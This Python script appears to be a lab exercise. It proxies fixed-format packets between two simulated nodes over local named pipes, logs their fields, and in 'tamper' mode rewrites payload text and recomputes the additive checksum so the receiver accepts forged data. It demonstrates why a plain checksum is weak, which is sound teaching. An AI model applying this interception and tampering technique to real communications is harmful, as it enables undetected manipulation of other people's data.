#!/usr/bin/env python3
import os
import sys
import struct
import argparse

# 272 Bytes total due to standard 1-byte structural padding before length field
PACKET_SIZE = 272
# Structure Layout: Little-Endian
# I=Header(4), B=srcID(1), B=destID(1), B=type(1), x=Padding(1), H=length(2), 256s=payload(256), H=checksum(2), I=seq(4)
STRUCT_FORMAT = "<I B B B x H 256s H I"
MAGIC_HEADER = 0xABCD1234

PIPE_IN = "/tmp/nodeA_to_attacker"
PIPE_OUT = "/tmp/attacker_to_nodeB"

def calculate_checksum(payload_bytes, length):
    """Calculates arithmetic sum checksum exactly matching sender.c logic."""
    checksum = 0
    for i in range(min(length, len(payload_bytes))):
        checksum += payload_bytes[i]
    return checksum & 0xFFFF

def process_packet(raw_data, mode, target_str, replace_str):
    if len(raw_data) < PACKET_SIZE:
        return raw_data

    # Unpack binary data structure
    header, src_id, dest_id, p_type, length, payload, checksum, seq = struct.unpack(STRUCT_FORMAT, raw_data)

    if header != MAGIC_HEADER:
        print("[-] Intercepted Malformed/Unknown Packet Block.")
        return raw_data

    # Clean the payload string representation
    clean_payload = payload[:length].decode('utf-8', errors='replace')
    
    print("\n" + "="*40)
    print(f"[*] INTERCEPTED PACKET [Seq: {seq}]")
    print("="*40)
    print(f" • Header      : 0x{header:X}")
    print(f" • Source ID   : {src_id}")
    print(f" • Dest ID     : {dest_id}")
    print(f" • Type        : {p_type}")
    print(f" • Length      : {length}")
    print(f" • Payload     : '{clean_payload}'")
    print(f" • Old Checksum: {checksum}")
    
    modified = False

    # Perform active Tampering/Modification if requested
    if mode == "tamper" and target_str and replace_str:
        if target_str in clean_payload:
            clean_payload = clean_payload.replace(target_str, replace_str)
            payload_bytes = clean_payload.encode('utf-8')
            length = len(payload_bytes)
            
            # Pad payload array up to 256 bytes
            payload = payload_bytes.ljust(256, b'\x00')
            
            # CRITICAL: Recalculate checksum so Receiver accepts the tampered data
            checksum = calculate_checksum(payload, length)
            modified = True
            print(f"[!] TAMPER ENGAGED: Altered payload to '{clean_payload}'")
            print(f"[!] Recalculated Checksum to: {checksum}")

    if not modified:
        print("[*] Strategy [SNIFF]: Forwarding packet unmodified.")

    print("="*40)

    # Repack into modified/unmodified 272-byte structural configuration
    return struct.pack(STRUCT_FORMAT, header, src_id, dest_id, p_type, length, payload, checksum, seq)

def main():
    parser = argparse.ArgumentParser(description="RISC-V MITM Pipeline Engine")
    parser.add_argument("--mode", choices=["sniff", "tamper"], default="sniff", help="Interception approach strategy")
    parser.add_argument("--target", help="Substring target to look for (Tamper Mode only)")
    parser.add_argument("--replace", help="String to inject instead (Tamper Mode only)")
    args = parser.parse_args()

    print(f"[*] Initializing Active Intercept Layer. Strategy: [{args.mode.upper()}]")

    if not os.path.exists(PIPE_IN) or not os.path.exists(PIPE_OUT):
        print("[-] Infrastructure Error: Named pipes missing. Run 'mkfifo' commands first.")
        sys.exit(1)

    print("[*] Opening Channel Read Target (Listening to Node A)...")
    fd_in = os.open(PIPE_IN, os.O_RDONLY)
    
    print("[*] Opening Channel Write Target (Forwarding to Node B)...")
    fd_out = os.open(PIPE_OUT, os.O_WRONLY)
    
    print("[+] Proxy routing channels engaged seamlessly.\n")

    try:
        while True:
            # Correct non-crashing system read implementation
            raw_packet = os.read(fd_in, PACKET_SIZE)
            if not raw_packet:
                break # Pipe closure signature
            
            # Process, parse, edit, and recalculate checksum properties
            out_packet = process_packet(raw_packet, args.mode, args.target, args.replace)
            
            # Transmit the data package to the receiver
            os.write(fd_out, out_packet)
            
    except KeyboardInterrupt:
        print("\n[*] Intercept Layer disconnected cleanly by administrator request.")
    finally:
        os.close(fd_in)
        os.close(fd_out)

if __name__ == "__main__":
    main()
